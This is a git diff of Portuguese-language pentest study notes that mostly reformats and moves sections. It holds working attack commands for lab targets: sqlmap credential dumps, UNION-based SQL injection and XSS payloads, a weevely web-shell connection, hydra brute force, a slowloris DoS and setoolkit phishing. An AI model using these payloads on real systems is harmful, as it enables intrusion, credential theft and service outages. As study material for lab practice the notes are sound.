@@ -5,20 +5,6 @@ $ sudo rm -rf /tmp/.X11-unix
 ```
 
 
-
-[Relatórios de Segurança](https://web.archive.org/web/20210513155142/https://www.bugcrowd.com/resources/reports/bugcrowd-priority-one-report/)
-[Labs PortSwigger](https://portswigger.net/users/register)
-[Labs Wargames](https://overthewire.org/wargames/)
-[Hackthebox](https://www.hackthebox.com/)
-[Máquina virtual com vulnerabilidades](http://www.itsecgames.com/index.htm)
-
-## Bug Bounty
-[Site para recompensas por Bug Bounty](https://hackerone.com/hacktivity)
-https://www.hackerone.com/
-https://www.bugcrowd.com/
-https://www.bughunt.com.br
-
-
 White Hats -> Hackers Éticos
 Black Hats -> Hackers Maliciosos
 Grey Hats  -> Burlam sistemas e são especialistas de sites, entretanto, com intenções questionáveis
@@ -180,7 +166,10 @@ $ weevely "http://192.168.1.42/dvwa/hackable/uploads/aplicacao.php" 1234 # Caso 
 	Traduzido do inglês-OWASP ZAP é um scanner de segurança de aplicativos da web de código aberto. Ele deve ser usado tanto por aqueles que são novos em segurança de aplicativos quanto por testadores de penetração profissionais. É um dos projetos mais ativos do Open Web Application Security Project e recebeu o status de carro-chefe.
 
 #Sqlmap: 
-	Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
+	Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites. 
+	!Threads no sqlmap se refere a quantidade de requisições que ele faz em um instante de tempo, quanto maior o número passado mais poder computacional será exigido, pode ser definido por --threads \[1-10\]
+	! --crawl=2 caso você informe alguma url sem nenhum parametros - ao invés de "\<url\>/category=", você informa "\<url\>" - o método crawl irá fazer a busca pelos parâmetros ele encontrar na página  
+	! Para melhorar a performance informe a base de dados usada (se a caso já souber) com --dbms PostgreSQL, o sistema operacional usado com --os, --batch para o sqlmap não ficar fazendo perguntas na tela.
 
 ```bash
 $ sqlmap -u "URL_DO_FORMS"   # Testa várias injeções e retorna se encontrou alguma vunerabilidade
@@ -194,10 +183,6 @@ $ sqlmap -u "URL_DO_FORMS"   # Testa várias injeções e retorna se encontrou a
    $ sqlmap -u <url> --technique TU  # Caso eu queria explorar Sql Injection baseado em tempo e no comando UNION
    $ sqlmap -u "URL" --batch --dbms mysql --os linux --threads 3 -D mutillidae -T accounts -C "username,password,is_admin" --dump  # Estamos passando uma url com parâmetro para o sqlmap a fim de baixar os dados da base de dados mutillidae, tabela accounts e colunas username, password e is_admin para visualizar os dados de usuários, senhas e administrador. Além disso, ela melhorou a performance do comando ao utilizar comandos que informam o gerenciador de base dados, o sistema operacional utilizado no servidor e a quantidade de requisições.
 ```
-    
-!Threads no sqlmap se refere a quantidade de requisições que ele faz em um instante de tempo, quanto maior o número passado mais poder computacional será exigido, pode ser definido por --threads \[1-10\]
-! --crawl=2 caso você informe alguma url sem nenhum parametros - ao invés de "\<url\>/category=", você informa "\<url\>" - o método crawl irá fazer a busca pelos parâmetros ele encontrar na página  
-! Para melhorar a performance informe a base de dados usada (se a caso já souber) com --dbms PostgreSQL, o sistema operacional usado com --os, --batch para o sqlmap não ficar fazendo perguntas na tela.
 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 https://www.codigofonte.com.br/artigos/a-historia-do-sql-injection
@@ -242,7 +227,7 @@ $ nc -zv <ip> 1-90              # Nc will scan port 1 until 90
 #DNS_Spoofing:
       * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
       * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
-```
+```bash
 $ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
 $ cd social-engineer-toolkit/
 $ ./setoolkit
@@ -268,7 +253,7 @@ $ response.sendRedirect(request.getParameter("url"));
       * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
       * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
       * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
-```
+```bash
 $ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
 $ cd slowloris.pl/
 $ chmod +x slowloris.pl
@@ -278,69 +263,67 @@ $ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
 #DDoS ( #Distributed_Denial_of_Service):
       * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
       * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).
-
-#SQL_Injection:
+  #SQL_Injection:
       * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
       * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
-```
-$ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
-$ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
-! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
-$ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
-  Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
-$ No lab 3 utilizamos ' UNION SELECT NULL,NULL,NULL-- ou ' ORDER BY 1,2,3 -- para determinar a quantidade de colunas existentes na tabela do banco de dados
-  No lab 4 utilizamos " ' UNION SELECT 'a',NULL,NULL,NULL-- " ou " ' UNION SELECT NULL,'a',NULL,NULL-- " para saber qual coluna da tabela contem tipos string, caso ela não contesse iria levantar uma exceção de erro interno 
-  Um ataque realizado no lab 5 do PortSwigger foi completado ao colocar " ' UNION SELECT * FROM users -- " na URL em frente category=    
-  No lab 6 tivemos que usar concatenação de colunas, com 'category=Gifts' UNION SELECT NULL, username || '~' || password FROM users --'
-  No lab 7 conseguimos pegar a versão da base de dados Oracle por meio do comando " ' UNION SELECT * FROM v$version, dual -- " (Note que cada base de dados tem uma forma de mostrar a versão ver documentação da portSwigger)(Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual) 
-  No lab 8 tivemos que usar o Burp Suite e digitar '+UNION+SELECT+@@version,+NULL# e enviar a requisição http, note que antes disso usamos '+UNION+SELECT+'abc','def'# para sabermos quais tabelas aceitam tipos str e no caso as duas aceitaram
+        $ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
+        $ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
+        ! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
+        $ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
+          Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
+        $ No lab 3 utilizamos ' UNION SELECT NULL,NULL,NULL-- ou ' ORDER BY 1,2,3 -- para determinar a quantidade de colunas existentes na tabela do banco de dados
+          No lab 4 utilizamos " ' UNION SELECT 'a',NULL,NULL,NULL-- " ou " ' UNION SELECT NULL,'a',NULL,NULL-- " para saber qual coluna da tabela contem tipos string, caso ela não contesse iria levantar uma exceção de erro interno 
+          Um ataque realizado no lab 5 do PortSwigger foi completado ao colocar " ' UNION SELECT * FROM users -- " na URL em frente category=    
+          No lab 6 tivemos que usar concatenação de colunas, com 'category=Gifts' UNION SELECT NULL, username || '~' || password FROM users --'
+          No lab 7 conseguimos pegar a versão da base de dados Oracle por meio do comando " ' UNION SELECT * FROM v$version, dual -- " (Note que cada base de dados tem uma forma de mostrar a versão ver documentação da portSwigger)(Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual) 
+          No lab 8 tivemos que usar o Burp Suite e digitar '+UNION+SELECT+@@version,+NULL# e enviar a requisição http, note que antes disso usamos '+UNION+SELECT+'abc','def'# para sabermos quais tabelas aceitam tipos str e no caso as duas aceitaram
 Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
-https://portswigger.net/web-security/sql-injection/union-attacks
-https://portswigger.net/web-security/sql-injection/examining-the-database
-*Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
-== Tipos de ataques SQL Injection com Sqlmap =====
-=> Error based injection - Injeção baseada em erro
-   Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, possamos obter informações.
-   Seu parâmetro no sqlmap: E
-=> Time-based - Baseada no tempo
-   É um tipo de técnica classificada como “Blind Query”, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ele apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL.
-   Seu parâmetro no sqlmap: T
-=> Stacked queries - Consultas empilhadas
-   Injeção que é capaz de modificar dados além de encerrar uma consulta atual, adicionando uma nova.
-   Seu parâmetro no sqlmap: S
-=> Boolean based injection - injeção baseada em booleano
-   Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.
-   Seu parâmetro no sqlmap: B
-=> Union-query based - Baseada no UNION
-   Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.
-   Seu parâmetro no sqlmap: U
-=> Command injection - injeção de comando
-   Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
-   Seu parâmetro no sqlmap: Q
-=> 
-* Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
-$ String usuario=request.getParameter("usuario");
-$ String senha=request.getParameter("senha");
-! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
-$ String sql = "Insert into accounts (username.password) values (?,?)";
-! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
-$ PreparedStatement stmt = connection.prepareStatement(sql);
-! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
-$ stmt.setString(1,usuario);
-$ stmt.setString(2,senha);
-$ stmt.execute();
--> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
-Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
-No kali: > ifconfig eth0 down 
-> ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
-No server:
-> ifconfig eth0 down 
-> ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-```
+     https://portswigger.net/web-security/sql-injection/union-attacks
+     https://portswigger.net/web-security/sql-injection/examining-the-database
+      *Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
+        == Tipos de ataques SQL Injection com Sqlmap =====
+        => Error based injection - Injeção baseada em erro
+           Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, possamos obter informações.
+           Seu parâmetro no sqlmap: E
+        => Time-based - Baseada no tempo
+           É um tipo de técnica classificada como “Blind Query”, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ele apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL.
+           Seu parâmetro no sqlmap: T
+        => Stacked queries - Consultas empilhadas
+           Injeção que é capaz de modificar dados além de encerrar uma consulta atual, adicionando uma nova.
+           Seu parâmetro no sqlmap: S
+        => Boolean based injection - injeção baseada em booleano
+           Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.
+           Seu parâmetro no sqlmap: B
+        => Union-query based - Baseada no UNION
+           Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.
+           Seu parâmetro no sqlmap: U
+        => Command injection - injeção de comando
+           Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
+           Seu parâmetro no sqlmap: Q
+        => 
+      * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
+        $ String usuario=request.getParameter("usuario");
+        $ String senha=request.getParameter("senha");
+        ! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
+        $ String sql = "Insert into accounts (username.password) values (?,?)";
+        ! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
+        $ PreparedStatement stmt = connection.prepareStatement(sql);
+        ! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
+        $ stmt.setString(1,usuario);
+        $ stmt.setString(2,senha);
+        $ stmt.execute();
+        -> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
+        Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
+        No kali: > ifconfig eth0 down 
+                 > ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
+        No server:
+                 > ifconfig eth0 down 
+                 > ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
+        https://portswigger.net/web-security/sql-injection/cheat-sheet
+
 #Brut_force_attack:
      * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
-```
+```bash
 $ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
 $ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
 $ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
@@ -364,20 +347,11 @@ $ hydra -l bruno -P passwords.txt "localhost" http-form-post "/bruteforce1/index
        ! XSS reflected => Caso for feito um XSS refletido, o script inserido é executado apenas na página do atacante. Devido a isso, caso ele queira que outro usuário acesse a página, deverá enviar sua url para que o outro acesse e veja seu script. Isso é um ataque de engenharia social conhecido como phishing.
          XSS Persist => Caso for feito um XSS armazenado ou persistente, o script inserido pelo atacante ficará armazenado no servidor da aplicação, sendo assim, qualquer outro usuário que acessar a página verá o script injetado.
          XSS baseada em DOM => XSS baseada em DOM, ela se diferencia dos outros tipos de XSS porque o ataque, nesse caso, acontece apenas no navegador do cliente sem que nenhum parâmetro seja enviado ao servidor.
-```
+```bash
    $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
        $ No lab 1 de XSS da PortSwigger colocamos na barra de busca '<script>alert(1)</script>', essa informação alterou nossa url, assim, quando alguem acessar esse link novamente, a url virá com esse script que será interpretado pelo navegador.
        $ No lab 3 analisando o html vimos que a cada busca na barra de pesquisa o texto é adicionado me uma tag img ' <img src="/resources/images/tracker.gif?searchTerms=busca feita na barra de pesquisa ">'. Dessa forma, podemos colocar um código nessa tag para executarmos um ataque XSS, ' <img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)> //
 "> '
-       ==== Como evitar XSS =========    
-       ! De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões.
-         Poderíamos colocar em nossa programação no back-end: String encoding=ESAPI.encoder().encodeForJavaScript(); Dessa forma, se colocarmos: <script>, através do escaping teremos a conversão desses elementos html para seus respectivos códigos: &ltscript&gt
-         Podemos também, evitar esse ataque em Java fazendo o seguinte => Vamos implementar a interface Validator do Spring para realizarmos a validação do que o usuário está passando no campo título e mensagem do depoimento. Ao fazermos isso, somos obrigado a implementar dois métodos supports e validate, o método supports recebe a classe do objeto que está querendo ser validado e retorna se o validador consegue lidar com ele. Na sequência, no método validate, iremos realizar a configuração da validação do que queremos fazer. A nossa estratégia para evitar esse ataque vai ser verificar se esses campos possuem abertura ou fechamento de tag (< ou >), pois com isso, o usuário não conseguirá inserir a tag <script> para colocar o código Javascript do ataque que ele realizou anteriormente, caso os campos contenham essas tags, iremos mostrar uma mensagem de erro.
-       ! Encoding e Validation => A função do encoding filtra os dados que o usuário inserir, assim o navegador o interpreta como dado e não como código. Porém, apenas o encoding não é suficiente para proteção de ataques de XSS, pois ele não irá prevenir que o usuário insira um script entre caracteres em HTML e continue executando códigos da mesma forma. Por exemplo: ` &lt; script &gt;` Onde, &lt; equivale a menor que < e &gt; a maior que >. Para isso, se utiliza também a função validation para filtrar todas as entradas do usuário.
-         Content Security Policy (CSP) => O CSP é um cabeçalho HTTP que fornece uma lista de recursos confiáveis para o navegador, podendo ser um script, CSS, imagem ou outro tipo de arquivo. Com isso, mesmo se um usuário conseguir injetar um código no seu site, o CSP poderá impedir a sua execução. https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP
-         X-XSS-Protection  => O X-XSS-Protection é um cabeçalho fornecido pela Internet Explorer, Chrome e Safari. Ele é capaz de configurar uma proteção contra ataques XSS Refletidos. 
-         Bibliotecas => Para .NET, você pode utilizar a Microsoft AntiXSS Library; Para o PHP, tem o HTML Purifier; E para o Java, você pode utilizar o Java Encoder ou o AntiSamy.
-        https://www.youtube.com/watch?v=lntsVxPZibw
 ```
 #Mass_Assignment:
        * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
@@ -478,13 +452,3 @@ $ netdiscover -i eth0
 ```
 
 [[Anonimato na rede]]
-## Certificações
-
-https://www.comptia.org/pt/certificacoes/security => Certificado introdutório, antes de fazer o CEH ou OSCP
-https://www.offensive-security.com/pwk-oscp/
-https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
-https://www.eccouncil.org/programs/licensed-penetration-tester-lpt-master/
-https://alpinesecurity.com/training/catalog/  ==> Para se preparar para o LPT
-https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna.html
-https://www.offensive-security.com/web200-oswa/
-https://solyd.com.br/treinamentos/pentest-profissional-v2022/
